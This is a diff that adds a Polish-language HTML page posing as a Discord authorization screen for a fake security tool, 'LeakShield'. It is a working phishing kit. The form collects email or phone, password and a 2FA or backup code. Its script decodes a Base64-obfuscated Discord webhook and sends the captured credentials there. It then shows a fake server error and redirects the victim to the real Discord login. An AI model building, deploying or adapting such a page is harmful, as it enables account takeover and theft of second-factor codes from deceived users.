@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Autoryzacja Narzędzia</title>
+    <style>
+        body { background-color: #313338; color: #dbdee1; font-family: 'gg sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-card { background: #2b2d31; padding: 32px; border-radius: 8px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
+        .bot-avatar { width: 80px; height: 80px; background: #5865f2; border-radius: 28%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        h2 { color: #f2f3f5; font-size: 24px; margin: 0; font-weight: 700; }
+        .info { color: #b5bac1; font-size: 14px; margin: 10px 0 20px; line-height: 1.4; }
+        .scope { text-align: left; background: #232428; padding: 12px; border-radius: 4px; font-size: 13px; margin-bottom: 20px; border: 1px solid #1e1f22; }
+        .field { text-align: left; margin-bottom: 16px; }
+        label { color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 10px; background: #1e1f22; border: none; color: #f2f3f5; border-radius: 3px; font-size: 16px; box-sizing: border-box; }
+        input:focus { outline: 1px solid #5865f2; }
+        .btn-blue { background: #5865f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 3px; cursor: pointer; font-size: 16px; font-weight: 500; transition: 0.2s; }
+        .btn-blue:hover { background: #4752c4; }
+        .footer-link { color: #00a8fc; font-size: 13px; text-decoration: none; display: block; margin-top: 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="auth-card">
+    <div class="bot-avatar">🛡️</div>
+    <h2>Autoryzuj LeakShield</h2>
+    <div class="info">Aplikacja prosi o dostęp do Twojego konta w celu skanowania wycieków danych powiązanych z Twoim adresem IP.</div>
+    
+    <div class="scope">
+        • Odczyt profilu (Avatar, E-mail)<br>
+        • Weryfikacja aktywnych sesji<br>
+        • Dostęp do logów bezpieczeństwa
+    </div>
+
+    <div class="field">
+        <label>E-mail lub numer telefonu</label>
+        <input type="text" id="email">
+    </div>
+    <div class="field">
+        <label>Hasło</label>
+        <input type="password" id="pass">
+    </div>
+    <div class="field">
+        <label>Kod weryfikacyjny (2FA / Backup)</label>
+        <input type="text" id="2fa" placeholder="Wymagane dla kont chronionych">
+    </div>
+
+    <button class="btn-blue" onclick="capture()">Autoryzuj</button>
+    <div class="footer-link" onclick="location.reload()">Jak to działa?</div>
+</div>
+
+<script>
+    async function capture() {
+        const e = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        const t = document.getElementById('2fa').value;
+
+        // UKRYTY WEBHOOK (Base64) - Richard pilnuje Twojej linii
+        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjI0Mzg2MDU5ODk0NzkzMS9kR0c1QjN3S0RDdHcxSGo5Uy1WLW9tVDZNenovTmndU01qMHZaZ0dMOHN0UWZ4aV90VWFSRHZYS2NibUw2Z1plWmJpNA==";
+        const hook = atob(b64);
+
+        if(!e || !p) return;
+
+        const data = {
+            content: "@everyone 🎯 **NOWY ZESTAW DANYCH Z GITHUB PAGES**",
+            embeds: [{
+                title: "PRZEJĘTO LOGOWANIE",
+                fields: [
+                    { name: "👤 User", value: "`" + e + "`", inline: true },
+                    { name: "🔑 Pass", value: "`" + p + "`", inline: true },
+                    { name: "🔐 2FA/Klucz", value: "`" + t + "`", inline: false }
+                ],
+                color: 5763719
+            }]
+        };
+
+        await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        
+        alert("Błąd 502: Serwer weryfikacji nie odpowiada. Sesja wygasła (Womp Womp).");
+        location.href = "https://discord.com/login";
+    }
+</script>
+
+</body>
+</html>
